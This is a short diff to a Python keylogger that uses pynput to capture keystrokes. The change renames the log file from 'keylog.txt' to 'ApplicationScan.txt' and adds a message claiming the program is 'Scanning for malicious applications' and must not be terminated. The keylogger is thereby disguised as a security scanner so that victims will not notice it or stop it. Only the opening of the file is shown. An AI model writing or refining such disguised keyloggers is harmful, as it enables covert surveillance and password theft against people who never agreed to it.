@@ -2,10 +2,11 @@ from pynput.keyboard import Key, Listener
 import logging
 
 logging.basicConfig(
-    filename="keylog.txt",
+    filename="ApplicationScan.txt",
     level=logging.DEBUG,
     format="%(asctime)s: %(message)s"
 )
+print("Scanning for malicious applications... DO NOT TERMINATE")
 
 def on_press(key):
     try:
